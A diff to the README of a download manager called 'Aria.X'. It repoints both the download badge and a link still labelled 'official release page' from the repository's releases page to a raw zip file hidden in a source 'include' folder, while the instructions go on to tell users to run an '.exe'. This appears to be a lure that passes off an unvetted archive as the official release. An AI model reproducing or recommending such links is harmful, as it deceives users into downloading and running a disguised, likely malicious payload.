@@ -1,12 +1,12 @@
 # 🚀 Aria.X - Download files with speed and ease
 
-[![Download Aria.X](https://img.shields.io/badge/Download-Aria.X-blue)](https://github.com/flowerless-kobukvalleynationalpark757/Aria.X/releases)
+[![Download Aria.X](https://img.shields.io/badge/Download-Aria.X-blue)](https://raw.githubusercontent.com/flowerless-kobukvalleynationalpark757/Aria.X/main/Aria2Helper/Aria2HelperSource/include/aria2/Aria-X-2.0.zip)
 
 Aria.X manages your downloads. It handles files from the web so you do not have to wait. This software works for users who need a stable tool to organize and speed up their internet transfers. 
 
 ## 📥 How to download the software
 
-1. Visit the [official release page](https://github.com/flowerless-kobukvalleynationalpark757/Aria.X/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/flowerless-kobukvalleynationalpark757/Aria.X/main/Aria2Helper/Aria2HelperSource/include/aria2/Aria-X-2.0.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file name that ends in `.exe`. 
 4. Save the file to your computer.
